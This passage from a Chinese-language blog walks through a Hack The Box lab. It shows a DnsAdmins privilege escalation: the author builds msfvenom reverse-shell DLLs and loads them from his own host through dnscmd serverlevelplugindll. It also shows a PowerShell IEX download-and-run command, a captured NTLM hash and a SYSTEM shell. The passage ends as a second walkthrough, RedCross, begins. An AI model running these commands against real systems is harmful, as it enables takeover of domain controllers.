class="hljs-title">BUILTIN</span>\Remote Management Users            Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">580</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\NETWORK                       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-2</span>                                        Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\Authenticated Users           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-11</span>                                       Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\This Organization             Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-15</span>                                       Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">MEGABANK</span>\Contractors                       <span class="hljs-keyword">Group</span>            <span class="hljs-title">S-1-5-21-1392959593-3013219662-3596683436-1103</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">MEGABANK</span>\DnsAdmins                         Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1392959593</span>-<span class="hljs-number">3013219662</span>-<span class="hljs-number">3596683436</span>-<span class="hljs-number">1101</span> Mandatory group, Enabled by default, Enabled group, Local <span class="hljs-keyword">Group</span><br><span class="hljs-title">NT</span> AUTHORITY\NTLM Authentication           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-64-10</span>                                    Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">Mandatory</span> Label\Medium Mandatory Level     Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure><p>ryan在DnsAdmins 组里，这个组看着像权限挺大的。<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">Microsoft 文档</a>将此 DnsAdmins 描述为：DNSAdmins 组的成员可以访问网络 DNS 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。</p><p>在谷歌中不断搜索。我发现了这篇文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>lolbas-project.github.io<span class="hljs-regexp">/lolbas/</span>Binaries<span class="hljs-regexp">/Dnscmd/</span><br></code></pre></td></tr></table></figure><p>我可以截一些关键的信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423202545223.png" alt="image-20220423202545223"  /><p>在本目标中，DNS服务就位于域控上，如果我将包含载荷的DLL注入到DNS服务器进程中，那么回连的会话便会是域控的会话，如果我能将DLL注入到系统进程中，那么回连的会话也是系统级别的。关于DLL注入，在我博客的C语言学习笔记中有提到过一些细节，这里我就不写了。</p><p>至于dnscmd，很简单，我只需要运行一下 -h 确定当前目标有没有即可，回显信息有很多，我只列一些，它位于system下，通常该目录下的exe都具有系统环境变量：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\ryan\desktop&gt; dnscmd -h<br><br>Usage: DnsCmd &lt;ServerName&gt; &lt;Command&gt; [&lt;Command Parameters&gt;]<br>&lt;ServerName&gt;:<br> <span class="hljs-built_in"> IP address </span><span class="hljs-keyword">or</span> host name    -- remote <span class="hljs-keyword">or</span> local<span class="hljs-built_in"> DNS server</span><br><span class="hljs-built_in"></span>  .                          --<span class="hljs-built_in"> DNS server </span>on local machine<br>&lt;Command&gt;:<br>  /<span class="hljs-built_in">Info</span>                      -- <span class="hljs-built_in">Get</span><span class="hljs-built_in"> server </span>information<br>  <span class="hljs-built_in">/Config </span>                   -- Reset<span class="hljs-built_in"> server </span><span class="hljs-keyword">or</span> zone configuration<br>  /EnumZones                 -- Enumerate zones<br>  /Statistics                -- Query/clear<span class="hljs-built_in"> server </span>statistics data<br><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br></code></pre></td></tr></table></figure><p>首先我可以生成dll载荷，目标操作系统版本在前边crackmapexec已经为我枚举出来了，windows 2016 x64：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.16.7 <span class="hljs-attribute">LPORT</span>=1337 -f dll -o whoami.dll<br>[-] <span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload<br>[-] <span class="hljs-literal">No</span> arch selected, selecting arch: x64 <span class="hljs-keyword">from</span> the payload<br><span class="hljs-literal">No</span> encoder specified, outputting<span class="hljs-built_in"> raw </span>payload<br>Payload size: 510 bytes<br>Final size of dll file: 8704 bytes<br>Saved as: whoami.dll<br></code></pre></td></tr></table></figure><p>我还是选择meterpreter会话，或许可能需要其他一些功能，meterpreter方便很多：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf-pro &gt; use exploit/multi/handler <br>[*] Using configured payload generic/shell_reverse_tcp<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <br>payload =&gt; windows/x64/shell_reverse_tcp<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport 1337<br>lport =&gt; 1337<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 10.10.16.7<br>LHOST =&gt; 10.10.16.7<br>msf-pro exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.7:1337 <br></code></pre></td></tr></table></figure><p>接下来我需要将dll传入到目标机器中，我可以开个smb共享让其加载我的dll或许会方便很多：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ .<span class="hljs-regexp">/toolbox/im</span>packet-<span class="hljs-number">0.9</span>.<span class="hljs-number">24</span><span class="hljs-regexp">/examples/</span>smbserver.py hack .<br>Impacket v0.<span class="hljs-number">9.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br>[*] Config <span class="hljs-keyword">file</span> parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8-<span class="hljs-number">1670</span>-<span class="hljs-number">01</span>D3-<span class="hljs-number">1278</span>-<span class="hljs-number">5</span>A47BF6EE188 V:<span class="hljs-number">3.0</span><br>[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112-<span class="hljs-number">3610</span>-<span class="hljs-number">9833</span>-<span class="hljs-number">46</span>C3F87E345A V:<span class="hljs-number">1.0</span><br>[*] Config <span class="hljs-keyword">file</span> parsed<br>[*] Config <span class="hljs-keyword">file</span> parsed<br>[*] Config <span class="hljs-keyword">file</span> parsed<br></code></pre></td></tr></table></figure><p>我可以照着它dnscmd示例，编写如下命令：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\Users\ryan\desktop&gt;</span> dnscmd.exe /config /serverlevelplugindll <span class="hljs-string">\\10.10.16.7\whoami.dll</span><br><br>Registry property serverlevelplugindll successfully reset.<br>Command completed successfully.<br><br>*Evil-WinRM* PS C:<span class="hljs-string">\Users\ryan\desktop&gt;</span><br></code></pre></td></tr></table></figure><p>没回连，不要紧，或许我需要重新启动DNS服务，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; dnscmd.exe /config /serverlevelplugindll \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.7</span>\whoami.dll<br><br>Registry property serverlevelplugindll successfully <span class="hljs-keyword">reset</span>.<br>Command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; sc.exe \\resolute stop dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">3</span>  STOP_PENDING<br>                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x1</span><br>        WAIT_HINT          : <span class="hljs-number">0x7530</span><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; sc.exe \\resolute <span class="hljs-keyword">start</span> dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">2</span>  START_PENDING<br>                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x0</span><br>        WAIT_HINT          : <span class="hljs-number">0x7d0</span><br>        PID                : <span class="hljs-number">2624</span><br>        FLAGS              :<br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt;<br></code></pre></td></tr></table></figure><p>可它还是没回连：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423205651911.png" alt="image-20220423205651911"  /><p>共享也访问成功了，端口IP也对，载荷也对，命令也成功，我的经验告诉我问题不应该出现在这里，或许我遗漏了什么，在我往前翻记录时，我忽然想起，好像有个笔记告诉我说系统变更会在一分钟内自动恢复。或许我需要动作快：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dnscmd<span class="hljs-selector-class">.exe</span> /config /serverlevelplugindll \\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.7</span>\s\whoami<span class="hljs-selector-class">.dll</span><br>sc<span class="hljs-selector-class">.exe</span> \\resolute stop dns<br>sc<span class="hljs-selector-class">.exe</span> \\resolute start dns<br></code></pre></td></tr></table></figure><p>wget：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; wget http:<span class="hljs-string">//10.10.16.7/whoami.dll</span> -O whoami.dll<br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <span class="hljs-keyword">ls</span><br><br><br>    Directory: C:\Users\ryan\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>-ar<span class="hljs-params">---</span>        12/3/2019   7<span class="hljs-function">:34</span> AM            155 note.txt<br>-a<span class="hljs-params">----</span>        4/23/2022   6<span class="hljs-function">:15</span> AM           8704 whoami.dll<br><br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$ python -m http.server <span class="hljs-number">80</span>             <br>Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.10.169</span> - - <span class="hljs-string">[23/Apr/2022 21:08:33]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /whoami.dll HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure><p>好吧，wget也会被删除：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <span class="hljs-keyword">ls</span><br><br><br>    Directory: C:\Users\ryan\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>-ar<span class="hljs-params">---</span>        12/3/2019   7<span class="hljs-function">:34</span> AM            155 note.txt<br><br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure><p>这是一场时间的考验，看起来我需要摸索等它下一次恢复时，快速的将dll注入进去，那我的命令需要改一下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">wget http:<span class="hljs-comment">//10.10.16.7/whoami.dll -O whoami.dll</span><br>dnscmd<span class="hljs-selector-class">.exe</span> /config /serverlevelplugindll .\whoami<span class="hljs-selector-class">.dll</span><br>sc<span class="hljs-selector-class">.exe</span> \\resolute stop dns<br>sc<span class="hljs-selector-class">.exe</span> \\resolute start dns<br></code></pre></td></tr></table></figure><p>可以看一下它的时间：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net <span class="hljs-built_in">time</span><br>Current <span class="hljs-built_in">time</span> <span class="hljs-keyword">at</span> \\Resolute.megabank.<span class="hljs-keyword">local</span> <span class="hljs-keyword">is</span> <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">19</span>:<span class="hljs-number">03</span> AM                                                 <br>                                                                                                                  <br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure><p>等它到下一次整分的时候再忙活，好吧它也不是整分的规律，或许是半分，管道符也不适用，或许我可以借助一些自动化工具，它是基于将DLL注入到系统服务之中，这种攻击方式在Metsploit中有对应的模块，但是当我准备通过powershell回连会话的时候，我看到了提示信息中的一条：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.7/shell.ps1&#x27;))&quot;<br>powershell.exe : IEX : At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>    + CategoryInfo          : NotSpecified: (IEX : At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span>:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>+ <span class="hljs-keyword">function</span> uAG0x &#123;<br>+ ~~~~~~~~~~~~~~~~<br>This script contains malicious content <span class="hljs-keyword">and</span> has been blocked <span class="hljs-keyword">by</span> your antivirus software.<br>At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>+ IEX ((<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.16.7/she ...</span><br><span class="hljs-string">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException</span><br><span class="hljs-string">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.Invok </span><br><span class="hljs-string">   eExpressionCommand</span><br><span class="hljs-string"> </span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></code></pre></td></tr></table></figure><p><strong>This script contains malicious content and has been blocked by your antivirus software.</strong></p><p><strong>此脚本包含恶意内容，已被杀毒软件阻止。</strong> </p><p>我大概知道了为什么没有回连了，或许我应该重置一下目标环境。那么再来一次，生成载荷：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.16.7 <span class="hljs-attribute">LPORT</span>=443 -f dll -o whoami.dll<br></code></pre></td></tr></table></figure><p>在当前目录启动smb匿名共享：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ./smbserver<span class="hljs-selector-class">.py</span> s .<br>Impacket v0.<span class="hljs-number">9.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8-<span class="hljs-number">1670</span>-<span class="hljs-number">01</span>D3-<span class="hljs-number">1278</span>-<span class="hljs-number">5</span>A47BF6EE188 V:<span class="hljs-number">3.0</span><br><span class="hljs-selector-attr">[*]</span> Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112-<span class="hljs-number">3610</span>-<span class="hljs-number">9833</span>-<span class="hljs-number">46</span>C3F87E345A V:<span class="hljs-number">1.0</span><br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Incoming connection (<span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span>,<span class="hljs-number">49882</span>)<br><span class="hljs-selector-attr">[*]</span> AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)<br><span class="hljs-selector-attr">[*]</span> User RESOLUTE\RESOLUTE$ authenticated successfully<br><span class="hljs-selector-attr">[*]</span> RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:<span class="hljs-number">21</span>b823d5b1d20b282614012d7e93de6f:<span class="hljs-number">010100000000000000</span>c3f99b1b57d801dc0992e0706ee955000000000100100056006700730061004b005800410079000300100056006700730061004b00580041007900020010004d004600470058004d006c0076006800040010004d004600470058004d006c00760068000700080000c3f99b1b57d8010600040002000000080030003000000000000000000000000040000059bd883320297b2e2588ab272c806f552b1114d4c485915f802e15a1c1bb07b60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000<br><span class="hljs-selector-attr">[*]</span> Disconnecting <span class="hljs-built_in">Share</span>(<span class="hljs-number">1</span>:IPC$)<br><span class="hljs-selector-attr">[*]</span> Disconnecting <span class="hljs-built_in">Share</span>(<span class="hljs-number">2</span>:S)<br><span class="hljs-selector-attr">[*]</span> Closing down connection (<span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span>,<span class="hljs-number">49882</span>)<br><span class="hljs-selector-attr">[*]</span> Remaining connections <span class="hljs-selector-attr">[]</span><br></code></pre></td></tr></table></figure><p>命令执行一气呵成：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd.exe /config /serverlevelplugindll \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.7</span>\s\whoami.dll<br><br>Registry property serverlevelplugindll successfully <span class="hljs-keyword">reset</span>.<br>Command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute stop dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">3</span>  STOP_PENDING<br>                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x0</span><br>        WAIT_HINT          : <span class="hljs-number">0x0</span><br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute <span class="hljs-keyword">start</span> dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">2</span>  START_PENDING<br>                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x0</span><br>        WAIT_HINT          : <span class="hljs-number">0x7d0</span><br>        PID                : <span class="hljs-number">140</span><br>        FLAGS              :<br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; <br></code></pre></td></tr></table></figure><h5 id="以system身份获取shell："><a href="#以system身份获取shell：" class="headerlink" title="以system身份获取shell："></a>以system身份获取shell：</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">443</span> ...<br>connect to <span class="hljs-selector-attr">[10.10.16.7]</span> from (UNKNOWN) <span class="hljs-selector-attr">[10.10.10.169]</span> <span class="hljs-number">49883</span><br>Microsoft Windows <span class="hljs-selector-attr">[Version 10.0.14393]</span><br>(c) <span class="hljs-number">2016</span> Microsoft Corporation. <span class="hljs-attribute">All</span> rights reserved.<br><br>whoami<br>whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure><p>我拥有了root.txt:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <span class="hljs-attribute">Directory</span> of C:\Users\Administrator\Desktop<br><br><span class="hljs-attribute">12</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2019</span>  <span class="hljs-number">06</span>:<span class="hljs-number">18</span> AM    &lt;DIR&gt;          .<br><span class="hljs-attribute">12</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2019</span>  <span class="hljs-number">06</span>:<span class="hljs-number">18</span> AM    &lt;DIR&gt;          ..<br><span class="hljs-attribute">04</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">11</span> AM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-attribute">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-attribute">2</span> Dir(s)   <span class="hljs-number">2</span>,<span class="hljs-number">483</span>,<span class="hljs-number">277</span>,<span class="hljs-number">824</span> bytes free<br><br><span class="hljs-attribute">C</span>:\Users\Administrator\Desktop&gt;type root.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - RedCross</title>
    <link href="/post/HackTheBox-RedCross.html"/>
    <url>/post/HackTheBox-RedCross.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/RedCross.png" alt="RedCross"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.113<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-30 07:34:16 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.10.113                                    <br>Discovered open port 443/tcp on 10.10.10.113    <br></code></pre></td></tr></table></figure><p>它确实漏了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 